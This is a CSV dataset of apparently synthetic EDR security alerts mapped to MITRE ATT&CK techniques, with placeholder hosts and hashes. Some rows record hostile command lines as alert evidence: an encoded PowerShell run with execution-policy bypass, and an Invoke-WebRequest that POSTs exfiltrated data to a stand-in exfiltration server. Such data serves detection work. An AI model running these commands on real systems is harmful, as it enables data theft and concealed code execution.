AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,combined_data
lkkkkjl0,,2023-03-10T12:00:00Z,,,,Domain Policy Modification,Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments,,,,,,Domain Policy Modification,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Domain Policy,example-policy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example-host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is lkkkkjl0. AlertTimestamp is 2023-03-10T12:00:00Z. AlertName is Domain Policy Modification. AlertDescription is Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Technique is Domain Policy Modification. Severity is High. EntityType is Domain Policy. EntityName is example-policy. Hostname is example-host. IP is 192.168.1.1. OperatingSystem is Windows 10. 
lllkld0,,2023-03-09T12:00:00.000000Z,,,,Fallback communication channel,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,,,,,powershell.exe,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,80,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HTTP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is lllkld0. AlertTimestamp is 2023-03-09T12:00:00.000000Z. AlertName is Fallback communication channel. AlertDescription is Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.. Severity is Medium. ProcessName is powershell.exe. CommandLine is powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=. DestinationIP is 192.168.1.100. FallbackProtocol is HTTP. 
3040607,,2023-03-09T12:00:00.000000Z,,,,Ingress Tool,Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp.,,,,,,Ingress Tool Transfer,,,,,,,,,,,,,,,,,Medium,,,EDR,,,,,,,,,,,,,,Initial Access,,,,powershell.exe,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,57234,10.0.2.15,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 03040607. AlertTimestamp is 2023-03-09T12:00:00.000000Z. AlertName is Ingress Tool. AlertDescription is Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp.. Technique is Ingress Tool Transfer. Severity is Medium. AlertType is EDR. Tactic is Initial Access. ProcessName is powershell.exe. CommandLine is powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand . SourceIp is 192.168.1.100. DestinationIp is 10.0.2.15. 
MDE-34567,,2022-10-31T15:23:45Z,,,,File or process modification,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\OpenSSH\sshd.exe,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Modified OpenSSH binary detected on host SERVER-ABC,2022-10-31T14:45:00Z,A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0,B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is MDE-34567. AlertTimestamp is 2022-10-31T15:23:45Z. AlertName is File or process modification. file_path is C:\Program Files\OpenSSH\sshd.exe. alert_severity is High. Alertescription is Modified OpenSSH binary detected on host SERVER-ABC. modified_time is 2022-10-31T14:45:00Z. original_hash is A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0. current_hash is B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1. 
alert_id_88,,2023-03-08T14:30:00Z,,,,Scheduled Transfer,"This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,cmd.exe,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertTimestamp is 2023-03-08T14:30:00Z. AlertName is Scheduled Transfer. AlertDescription is This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.. Severity is Medium. AlertId is 12345678-1234-1234-1234-123456789012. DetectionSource is Microsoft Defender for Endpoint. ProcessName is cmd.exe. CommandLine is robocopy C:\LocalFolder \\RemoteServer\Share /E. RemoteServer is \\RemoteServer\Share. "
3040506078,,2023-03-10T12:00:00Z,,,,Access Token Compromise,Indications of Access Token Manipulation activity have been found on the endpoint.,,,,,,Access Token Manipulation,,,,,,,,,,,,,,,,,High,,,,,Endpoint Detection and Response,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 03040506078. AlertTimestamp is 2023-03-10T12:00:00Z. AlertName is Access Token Compromise. AlertDescription is Indications of Access Token Manipulation activity have been found on the endpoint.. Technique is Access Token Manipulation. Severity is High. Category is Endpoint Detection and Response. OS is Windows 10 Pro. User is JohnDoe. Hostname is endpoint1. IP is 192.168.1.100. 
EDR-13579,,2022-10-31T23:59:59Z,,,,Bowser Extension,A suspicious browser extension detected on host DESKTOP-123 was installed on Google Chrome,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'DESKTOP-123', 'ip_address': '192.168.1.100'}",Suspicious Activity,Remove the suspicious browser extension from the host,"{'extension_name': 'Malicious Extension', 'extension_publisher': 'Unknown', 'browser_name': 'Google Chrome', 'browser_version': '95.0.4638.69', 'extension_path': 'C:\\Program Files\\Google\\Chrome\\Extensions\\maliciousextension'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is EDR-13579. AlertTimestamp is 2022-10-31T23:59:59Z. AlertName is Bowser Extension. AlertDescription is A suspicious browser extension detected on host DESKTOP-123 was installed on Google Chrome. alert_severity is High. affected_host hostname is DESKTOP-123. affected_host ip_address is 192.168.1.100. alert_category is Suspicious Activity. alert_recommendation is Remove the suspicious browser extension from the host. alert_details extension_name is Malicious Extension. alert_details extension_publisher is Unknown. alert_details browser_name is Google Chrome. alert_details browser_version is 95.0.4638.69. alert_details extension_path is C:\Program Files\Google\Chrome\Extensions\maliciousextension. 
334566777,,2023-03-10T12:00:00Z,,,,Debugger Evasion,Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment.,,,,,High,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 334566777. AlertTimestamp is 2023-03-10T12:00:00Z. AlertName is Debugger Evasion. AlertDescription is Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment.. AlertSeverity is High. Technique is Debugger Evasion. Tactic is Defense Evasion. Recommendation is Investigate the process %process_name% for signs of malicious activity.. Source is Defender for Endpoint. RuleName is Debugger Evasion. 
99782345,,2022-03-15T10:30:00Z,,,,Potential website defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.",,,,,,,,,C:\inetpub\wwwroot\index.html,,,iexplore.exe https://example.com/,,,,,,,,,,,High,,,Behavior,,Web,,,,,,,,EDR,,,,,,,,C:\Windows\System32\iexplore.exe,,,,,,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-15T10:15:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SysWOW64\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,Web,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 99782345. AlertTimestamp is 2022-03-15T10:30:00Z. AlertName is Potential website defacement. AlertDescription is Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.. AffectedFilePath is C:\inetpub\wwwroot\index.html. ProcessCommandLine is iexplore.exe https://example.com/. Severity is High. AlertType is Behavior. Category is Web. DetectionSource is EDR. ProcessName is C:\Windows\System32\iexplore.exe. DeviceName is example-device. OsPlatform is Windows. OsVersion is 10.0.19042. ProcessCreationTime is 2022-03-15T10:15:00Z. ProcessParentName is C:\Windows\SysWOW64\explorer.exe. ProcessParentCommandLine is explorer.exe. AttackVector is Web. "
,,,,,,Exfiltration Over Web Service,"This alert is triggered when there is suspicious network traffic that indicates exfiltration over a web service. This could be an indication of data exfiltration, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,explorer.exe,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1567,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:30:00Z,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,,"AlertName is Exfiltration Over Web Service. AlertDescription is This alert is triggered when there is suspicious network traffic that indicates exfiltration over a web service. This could be an indication of data exfiltration, and warrants further investigation.. Severity is High. AlertId is 12345678-1234-1234-1234-123456789012. DetectionSource is Microsoft Defender for Endpoint. ProcessName is explorer.exe. CommandLine is powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data. EventId is T1567. AlertTimestampUtc is 2023-03-08T14:30:00Z. WebServerUrl is http://exfiltration-server.com. WebServerMethod is POST. "
33456678,,2023-03-10T15:00:00.000Z,,,,Deobfuscate-Decode Files,"An adversary may use Obfuscation or Encoding to hide or obscure the content of files or other information they are exfiltrating. These obfuscation and encoding techniques include ASCII, Base64, binary-to-text encoding, and others.",,,,,,Deobfuscate/Decode Files or Information,,,,,,,,,,,,,,,,,High,,,,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the endpoint for any signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 33456678. AlertTimestamp is 2023-03-10T15:00:00.000Z. AlertName is Deobfuscate-Decode Files. AlertDescription is An adversary may use Obfuscation or Encoding to hide or obscure the content of files or other information they are exfiltrating. These obfuscation and encoding techniques include ASCII, Base64, binary-to-text encoding, and others.. Technique is Deobfuscate/Decode Files or Information. Severity is High. Category is Malware. Recommendation is Investigate the endpoint for any signs of malicious activity.. "
123456,,2022-02-28T09:15:00Z,high,endpoint,,Unusual Connection Attempt,"Analysis of processes running has detected an uncommon connection attempt through applications layer protocol. This is very rare in normal operations, but a known technique for attackers attempting to bypass network-layer detections.",,,,,,,,,,,,,,,EDR,Command and Control,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,HTTPS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Application Layer Protocol,192.168.1.100,,,,,,,,,,,,,,,,,,,,"AlertID is 123456. AlertTimestamp is 2022-02-28T09:15:00Z. severity is high. category is endpoint. AlertName is Unusual Connection Attempt. AlertDescription is Analysis of processes running has detected an uncommon connection attempt through applications layer protocol. This is very rare in normal operations, but a known technique for attackers attempting to bypass network-layer detections.. source is EDR. tactic is Command and Control. process_name is explorer.exe. protocol is HTTPS. technique is Application Layer Protocol. remote_ip is 192.168.1.100. "
93345,,,,,,container administration,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.",,,,,,,,,,,,,,,,,,,,,,,High,,,EDR,,Behavioral,,,{},,New,,,Machine,,,,,,,,,docker exec -it mycontainer /bin/sh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mydomain.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.19041.1237,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,604800,2022-12-31T23:59:59Z,Behavior,False,2022-12-31T23:59:59Z,mycomputer.mydomain.com,mycomputer.mydomain.com,MYCOMPUTER,Windows 10 Enterprise,x64,2022-12-31T23:45:00Z,2022-12-31T23:59:59Z,DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,dockerd.exe,2022-12-31T23:45:00Z,Microsoft,High,Forced Container Administration Command,"AlertID is 0093345. AlertName is container administration. AlertDescription is Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.. Severity is High. AlertType is EDR. Category is Behavioral. Status is New. DetectionSource is Machine. CommandLine is docker exec -it mycontainer /bin/sh. DomainName is mydomain.com. OSVersion is 10.0.19041.1237. DetectionTime is 2022-12-31T23:59:59Z. DetectionType is Behavior. LastUpdateTime is 2022-12-31T23:59:59Z. DnsName is mycomputer.mydomain.com. FullyQualifiedDomainName is mycomputer.mydomain.com. NetBiosName is MYCOMPUTER. OSPlatform is Windows 10 Enterprise. ProcessorArchitecture is x64. CreationTime is 2022-12-31T23:45:00Z. End is 2022-12-31T23:59:59Z. FileHash is DA39A3EE5E6B4B0D3255BFEF95601890AFD80709. FileName is dockerd.exe. Start is 2022-12-31T23:45:00Z. VendorName is Microsoft. VendorSeverity is High. VendorThreatName is Forced Container Administration Command. "
